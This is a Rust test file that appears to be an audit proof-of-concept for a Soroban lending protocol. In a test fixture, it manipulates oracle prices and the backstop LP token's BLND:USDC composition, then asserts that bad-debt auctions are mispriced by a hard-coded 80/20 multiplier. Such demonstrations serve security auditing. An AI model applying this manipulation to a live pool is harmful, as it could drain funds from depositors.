#![cfg(test)]
use soroban_sdk::{testutils::Address as _, Address, vec};
use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};
use pool::{Request, RequestType};

#[test]
fn test_backstop_token_valuation_vulnerability() {
    // Create a test fixture with the necessary setup
    let fixture = create_fixture_with_data(false);
    let pool_fixture = &fixture.pools[0];
    
    // Create a user that will participate in the test
    let user = Address::generate(&fixture.env);
    fixture.tokens[TokenIndex::STABLE].mint(&user, &(1100 * 10i128.pow(6)));

    // Step 1: User deposits $1k stable and borrows to 90% borrow limit
    let setup_request = vec![
        &fixture.env,
        Request {
            request_type: RequestType::SupplyCollateral as u32,
            address: fixture.tokens[TokenIndex::STABLE].address.clone(),
            amount: 1000 * 10i128.pow(6),
        },
        Request {
            request_type: RequestType::Borrow as u32,
            address: fixture.tokens[TokenIndex::XLM].address.clone(),
            amount: 6075 * SCALAR_7,
        },
    ];
    pool_fixture
        .pool
        .submit(&user, &user, &user, &setup_request);

    // Step 2: Simulate a price crash that makes the user's position undercollateralized
    fixture.oracle.set_price_stable(&vec![
        &fixture.env,
        2000_0000000, // eth
        1_0000000,    // usdc
        0_0500000,    // xlm - price crash by 50%
        1_0000000,    // stable
    ]);
    
    // Step 3: Liquidate the user's position
    pool_fixture.pool.new_auction(
        &0, // UserLiquidation auction type
        &user,
        &vec![
            &fixture.env,
            fixture.tokens[TokenIndex::XLM].address.clone(),
        ],
        &vec![
            &fixture.env,
            fixture.tokens[TokenIndex::STABLE].address.clone(),
        ],
        &50,
    );
    
    // Step 4: Verify the auction was created
    assert!(pool_fixture.pool.try_get_auction(&0, &user).is_ok());
    
    // Step 5: Create a bad debt auction
    // First, we need to manipulate the LP token composition to deviate from the 80/20 split
    
    // Get the current backstop data
    let backstop_data_before = fixture.backstop.pool_data(&pool_fixture.pool.address);
    println!("Backstop data before:");
    println!("  BLND: {}", backstop_data_before.blnd);
    println!("  USDC: {}", backstop_data_before.usdc);
    println!("  Tokens: {}", backstop_data_before.tokens);
    
    // Calculate the actual ratio of BLND to USDC
    let actual_ratio_before = if backstop_data_before.usdc > 0 {
        backstop_data_before.blnd as f64 / backstop_data_before.usdc as f64
    } else {
        0.0
    };
    println!("  Actual BLND:USDC ratio: {:.2}:1", actual_ratio_before);
    
    // Now let's change the composition of the LP token by adding more USDC to the pool
    // This simulates a scenario where the LP token composition has changed from the expected 80/20 split
    let admin = fixture.users[0].clone();
    
    // Add more USDC to the LP pool to change the ratio
    fixture.tokens[TokenIndex::USDC].mint(&admin, &(50_000 * 10i128.pow(6)));
    fixture.tokens[TokenIndex::USDC].approve(&admin, &fixture.lp.address, &i128::MAX, &99999);
    
    // Join the pool with just USDC to change the ratio
    // We'll use join_pool with a very small amount of BLND
    fixture.tokens[TokenIndex::BLND].mint(&admin, &(1 * 10i128.pow(6)));
    fixture.tokens[TokenIndex::BLND].approve(&admin, &fixture.lp.address, &i128::MAX, &99999);
    
    fixture.lp.join_pool(
        &0, // minimum LP tokens to receive
        &vec![
            &fixture.env,
            1 * 10i128.pow(6), // very small amount of BLND
            50_000 * 10i128.pow(6), // large amount of USDC
        ],
        &admin,
    );
    
    // Get the updated backstop data
    let backstop_data_after = fixture.backstop.pool_data(&pool_fixture.pool.address);
    println!("Backstop data after LP composition change:");
    println!("  BLND: {}", backstop_data_after.blnd);
    println!("  USDC: {}", backstop_data_after.usdc);
    println!("  Tokens: {}", backstop_data_after.tokens);
    
    // Calculate the new ratio of BLND to USDC
    let actual_ratio_after = if backstop_data_after.usdc > 0 {
        backstop_data_after.blnd as f64 / backstop_data_after.usdc as f64
    } else {
        0.0
    };
    println!("  Actual BLND:USDC ratio: {:.2}:1", actual_ratio_after);
    
    // Step 6: Create a bad debt auction
    // We need to create a scenario where the backstop has liabilities
    // First, let's make the user default on their loan
    
    // Simulate a severe price crash that makes the collateral worthless
    fixture.oracle.set_price_stable(&vec![
        &fixture.env,
        2000_0000000, // eth
        1_0000000,    // usdc
        0_0100000,    // xlm - severe price crash by 90%
        1_0000000,    // stable
    ]);
    
    // Liquidate the user's position with a high percentage
    pool_fixture.pool.new_auction(
        &0, // UserLiquidation auction type
        &user,
        &vec![
            &fixture.env,
            fixture.tokens[TokenIndex::XLM].address.clone(),
        ],
        &vec![
            &fixture.env,
            fixture.tokens[TokenIndex::STABLE].address.clone(),
        ],
        &100, // 100% liquidation
    );
    
    // Create a liquidator
    let liquidator = Address::generate(&fixture.env);
    fixture.tokens[TokenIndex::STABLE].mint(&liquidator, &(10000 * 10i128.pow(6)));
    
    // Fill the liquidation auction
    let _auction_data = pool_fixture.pool.get_auction(&0, &user);
    
    // Use the correct RequestType for filling a user liquidation auction
    let fill_request = vec![
        &fixture.env,
        Request {
            request_type: RequestType::FillUserLiquidationAuction as u32,
            address: user.clone(),
            amount: 100, // 100% fill
        },
    ];
    
    pool_fixture.pool.submit(&liquidator, &liquidator, &liquidator, &fill_request);
    
    // Now the backstop should have some bad debt
    // Create a bad debt auction
    let backstop_address = fixture.backstop.address.clone();
    
    // Create a bad debt auction - use auction type 1 for BadDebtAuction
    pool_fixture.pool.new_auction(
        &1, // BadDebtAuction auction type
        &backstop_address,
        &vec![
            &fixture.env,
            fixture.tokens[TokenIndex::XLM].address.clone(),
        ],
        &vec![
            &fixture.env,
            fixture.lp.address.clone(),
        ],
        &100, // 100% auction
    );
    
    // Get the bad debt auction data
    let bad_debt_auction = pool_fixture.pool.get_auction(&1, &backstop_address);
    
    // Calculate what the lot amount would be with the correct LP token composition
    // vs what it actually is with the fixed multiplier of 5
    
    // The vulnerability: The code uses a fixed multiplier of 5 based on an assumed 80/20 split
    // But the actual composition has changed, leading to mispriced auctions
    
    println!("Bad Debt Auction Data:");
    println!("  Bid assets: {:?}", bad_debt_auction.bid);
    println!("  Lot assets: {:?}", bad_debt_auction.lot);
    
    // Calculate what the lot amount would be if we used the actual composition
    // vs what it is with the fixed multiplier of 5
    let actual_ratio = actual_ratio_after;
    let assumed_ratio = 4.0; // 80/20 = 4:1 ratio
    
    println!("Vulnerability Analysis:");
    println!("  Assumed BLND:USDC ratio: 4:1 (fixed in code)");
    println!("  Actual BLND:USDC ratio: {:.2}:1", actual_ratio);
    
    // If the actual ratio is significantly different from 4:1, the auction is mispriced
    if (actual_ratio - assumed_ratio).abs() > 0.5 {
        println!("  VULNERABILITY CONFIRMED: The LP token composition has changed significantly from the assumed 80/20 split");
        println!("  This leads to mispriced bad debt auctions, potentially causing loss of funds");
    } else {
        println!("  No significant deviation from assumed ratio detected");
    }
    
    // The vulnerability is confirmed if the actual ratio is significantly different from 4:1
    assert!((actual_ratio - assumed_ratio).abs() > 0.5, "Vulnerability not demonstrated - LP token composition hasn't changed enough");
} 